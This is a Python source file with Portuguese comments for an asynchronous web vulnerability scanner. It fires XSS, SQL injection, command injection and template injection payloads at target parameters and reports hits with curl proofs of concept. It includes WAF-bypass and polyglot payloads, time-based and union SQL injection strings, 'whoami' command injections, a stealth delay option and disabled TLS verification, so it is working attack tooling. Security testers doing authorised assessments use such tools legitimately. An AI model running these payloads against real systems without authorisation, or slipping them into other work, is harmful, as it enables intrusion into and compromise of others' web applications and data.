"""Scanner de vulnerabilidades XSS/SQLi com bypass de WAF."""
import asyncio
import re
from dataclasses import dataclass
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

import httpx
import structlog
from rich.console import Console
from rich.progress import Progress

logger = structlog.get_logger(__name__)
console = Console()


@dataclass
class Vulnerability:
    """Vulnerabilidade encontrada."""
    type: str  # xss, sqli, rce, etc
    severity: str  # critical, high, medium, low
    url: str
    parameter: str
    payload: str
    method: str
    evidence: str
    poc: str


class VulnScanner:
    """
    Scanner de vulnerabilidades web.
    
    Detecta:
    - XSS (Reflected, Stored, DOM-based)
    - SQL Injection (Error-based, Boolean-based, Time-based)
    - Command Injection
    - Template Injection
    - Open Redirect
    - SSRF
    """
    
    # XSS Payloads
    XSS_PAYLOADS = [
        # Basic
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        # Encoded
        '%3Cscript%3Ealert(1)%3C/script%3E',
        # Context breaking
        '"><script>alert(1)</script>',
        '\'-alert(1)-\'',
        # Event handlers
        '" onmouseover="alert(1)',
        '<body onload=alert(1)>',
        # WAF bypass
        '<scrip<script>t>alert(1)</script>',
        '<img src=x oneonerrorrror=alert(1)>',
        # Polyglot
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>',
    ]
    
    # SQLi Payloads
    SQLI_PAYLOADS = [
        # Error-based
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        # Boolean-based
        "1' AND '1'='1",
        "1' AND '1'='2",
        # Time-based
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        # WAF bypass
        "1'/**/OR/**/1=1--",
        "1'/**/AND/**/SLEEP(5)--",
        "1' /*!50000AND*/ SLEEP(5)--",
    ]
    
    # SQLi Error Signatures
    SQLI_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.* SQL[-_ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
    ]
    
    # Command Injection
    CMD_PAYLOADS = [
        '; ls',
        '| ls',
        '&& ls',
        '|| ls',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
    ]
    
    # Template Injection
    TEMPLATE_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '#{7*7}',
    ]
    
    def __init__(
        self,
        targets: List[Dict[str, Any]],  # List of {url, method, params}
        vuln_types: Optional[List[str]] = None,
        threads: int = 10,
        timeout: float = 10.0,
        waf_bypass: bool = True,
        stealth_level: int = 0,
    ):
        self.targets = targets
        self.vuln_types = vuln_types or ['xss', 'sqli']
        self.threads = threads
        self.timeout = timeout
        self.waf_bypass = waf_bypass
        self.stealth_level = stealth_level
        
        self.vulnerabilities: List[Vulnerability] = []
    
    async def scan(self) -> List[Vulnerability]:
        """Executa scan de vulnerabilidades."""
        logger.info("vulnscan.start", targets=len(self.targets), types=self.vuln_types)
        
        semaphore = asyncio.Semaphore(self.threads)
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            
            tasks = []
            for target in self.targets:
                if 'xss' in self.vuln_types:
                    tasks.append(self._test_xss(client, semaphore, target))
                if 'sqli' in self.vuln_types:
                    tasks.append(self._test_sqli(client, semaphore, target))
                if 'cmdi' in self.vuln_types:
                    tasks.append(self._test_cmdi(client, semaphore, target))
                if 'ssti' in self.vuln_types:
                    tasks.append(self._test_ssti(client, semaphore, target))
            
            with Progress() as progress:
                task_id = progress.add_task("[cyan]Scanning...", total=len(tasks))
                
                for coro in asyncio.as_completed(tasks):
                    await coro
                    progress.advance(task_id)
        
        logger.info("vulnscan.complete", vulnerabilities=len(self.vulnerabilities))
        return self.vulnerabilities
    
    async def _test_xss(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
        target: Dict[str, Any]
    ):
        """Testa XSS."""
        async with semaphore:
            url = target['url']
            method = target.get('method', 'GET')
            params = target.get('params', {})
            
            for param_name in params.keys():
                for payload in self.XSS_PAYLOADS:
                    try:
                        # Stealth delay
                        if self.stealth_level > 0:
                            await asyncio.sleep(self.stealth_level * 0.2)
                        
                        # Injeta payload
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if method == 'GET':
                            response = await client.get(url, params=test_params)
                        else:
                            response = await client.post(url, data=test_params)
                        
                        # Verifica se payload aparece na resposta
                        if payload in response.text:
                            # Verifica se não está encoded/escaped
                            if self._is_xss_exploitable(response.text, payload):
                                vuln = Vulnerability(
                                    type='xss',
                                    severity='high',
                                    url=url,
                                    parameter=param_name,
                                    payload=payload,
                                    method=method,
                                    evidence=self._extract_evidence(response.text, payload),
                                    poc=self._generate_poc(url, method, test_params)
                                )
                                self.vulnerabilities.append(vuln)
                                
                                console.print(
                                    f"  [red]✗ XSS[/red] found in [cyan]{url}[/cyan] "
                                    f"param: [yellow]{param_name}[/yellow]"
                                )
                                
                                logger.warning(
                                    "vulnscan.xss.found",
                                    url=url,
                                    param=param_name,
                                    payload=payload[:50]
                                )
                                break
                    
                    except Exception as e:
                        logger.debug("vulnscan.xss.error", error=str(e))
    
    async def _test_sqli(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
        target: Dict[str, Any]
    ):
        """Testa SQL Injection."""
        async with semaphore:
            url = target['url']
            method = target.get('method', 'GET')
            params = target.get('params', {})
            
            for param_name in params.keys():
                # Get baseline
                baseline = await self._get_baseline(client, url, method, params)
                
                for payload in self.SQLI_PAYLOADS:
                    try:
                        if self.stealth_level > 0:
                            await asyncio.sleep(self.stealth_level * 0.2)
                        
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if method == 'GET':
                            response = await client.get(url, params=test_params)
                        else:
                            response = await client.post(url, data=test_params)
                        
                        # Error-based detection
                        if self._has_sql_error(response.text):
                            vuln = Vulnerability(
                                type='sqli',
                                severity='critical',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method=method,
                                evidence=self._extract_sql_error(response.text),
                                poc=self._generate_poc(url, method, test_params)
                            )
                            self.vulnerabilities.append(vuln)
                            
                            console.print(
                                f"  [red]✗ SQLi[/red] found in [cyan]{url}[/cyan] "
                                f"param: [yellow]{param_name}[/yellow]"
                            )
                            
                            logger.warning(
                                "vulnscan.sqli.found",
                                url=url,
                                param=param_name,
                                payload=payload[:50]
                            )
                            break
                        
                        # Boolean-based detection
                        if baseline and self._is_boolean_sqli(baseline, response):
                            vuln = Vulnerability(
                                type='sqli',
                                severity='high',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method=method,
                                evidence=f"Response differs from baseline",
                                poc=self._generate_poc(url, method, test_params)
                            )
                            self.vulnerabilities.append(vuln)
                            break
                    
                    except Exception as e:
                        logger.debug("vulnscan.sqli.error", error=str(e))
    
    async def _test_cmdi(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
        target: Dict[str, Any]
    ):
        """Testa Command Injection."""
        async with semaphore:
            url = target['url']
            method = target.get('method', 'GET')
            params = target.get('params', {})
            
            for param_name in params.keys():
                for payload in self.CMD_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if method == 'GET':
                            response = await client.get(url, params=test_params)
                        else:
                            response = await client.post(url, data=test_params)
                        
                        # Verifica output de comandos
                        if self._has_cmd_output(response.text):
                            vuln = Vulnerability(
                                type='cmdi',
                                severity='critical',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method=method,
                                evidence=self._extract_evidence(response.text, 'root|bin|usr|var'),
                                poc=self._generate_poc(url, method, test_params)
                            )
                            self.vulnerabilities.append(vuln)
                            
                            console.print(
                                f"  [red]✗ Command Injection[/red] found in [cyan]{url}[/cyan] "
                                f"param: [yellow]{param_name}[/yellow]"
                            )
                            break
                    
                    except Exception as e:
                        logger.debug("vulnscan.cmdi.error", error=str(e))
    
    async def _test_ssti(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
        target: Dict[str, Any]
    ):
        """Testa Server-Side Template Injection."""
        async with semaphore:
            url = target['url']
            method = target.get('method', 'GET')
            params = target.get('params', {})
            
            for param_name in params.keys():
                for payload in self.TEMPLATE_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if method == 'GET':
                            response = await client.get(url, params=test_params)
                        else:
                            response = await client.post(url, data=test_params)
                        
                        # Verifica se 7*7=49
                        if '49' in response.text and payload in response.text:
                            vuln = Vulnerability(
                                type='ssti',
                                severity='critical',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method=method,
                                evidence='Template expression evaluated',
                                poc=self._generate_poc(url, method, test_params)
                            )
                            self.vulnerabilities.append(vuln)
                            
                            console.print(
                                f"  [red]✗ SSTI[/red] found in [cyan]{url}[/cyan] "
                                f"param: [yellow]{param_name}[/yellow]"
                            )
                            break
                    
                    except Exception as e:
                        logger.debug("vulnscan.ssti.error", error=str(e))
    
    async def _get_baseline(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        params: dict
    ) -> Optional[httpx.Response]:
        """Get baseline response."""
        try:
            if method == 'GET':
                return await client.get(url, params=params)
            else:
                return await client.post(url, data=params)
        except:
            return None
    
    def _is_xss_exploitable(self, html: str, payload: str) -> bool:
        """Verifica se XSS é explorável (não escaped)."""
        # Simplificado - verifica se payload aparece sem encoding
        escaped_chars = ['&lt;', '&gt;', '&quot;', '&#', '\\"', "\\'"]
        for char in escaped_chars:
            if char in html:
                # Pode estar encoded
                return False
        return True
    
    def _has_sql_error(self, text: str) -> bool:
        """Verifica se há erro SQL."""
        for pattern in self.SQLI_ERRORS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _extract_sql_error(self, text: str) -> str:
        """Extrai mensagem de erro SQL."""
        for pattern in self.SQLI_ERRORS:
            match = re.search(f"({pattern}[^\n]*)", text, re.IGNORECASE)
            if match:
                return match.group(1)[:200]
        return "SQL error detected"
    
    def _is_boolean_sqli(self, baseline: httpx.Response, response: httpx.Response) -> bool:
        """Detecta Boolean-based SQLi."""
        # Compara tamanhos de resposta
        size_diff = abs(len(baseline.content) - len(response.content))
        return size_diff > 100  # Diferença significativa
    
    def _has_cmd_output(self, text: str) -> bool:
        """Verifica se há output de comando."""
        cmd_patterns = [r'root:', r'/bin/', r'/usr/', r'/var/', r'uid=', r'gid=']
        for pattern in cmd_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _extract_evidence(self, text: str, pattern: str) -> str:
        """Extrai evidência."""
        match = re.search(f"(.{{0,50}}{pattern}.{{0,50}})", text, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()[:200]
        return pattern
    
    def _generate_poc(self, url: str, method: str, params: dict) -> str:
        """Gera Proof of Concept."""
        if method == 'GET':
            query = urlencode(params)
            return f"curl '{url}?{query}'"
        else:
            data = urlencode(params)
            return f"curl -X POST '{url}' -d '{data}'"


__all__ = ["VulnScanner", "Vulnerability"]
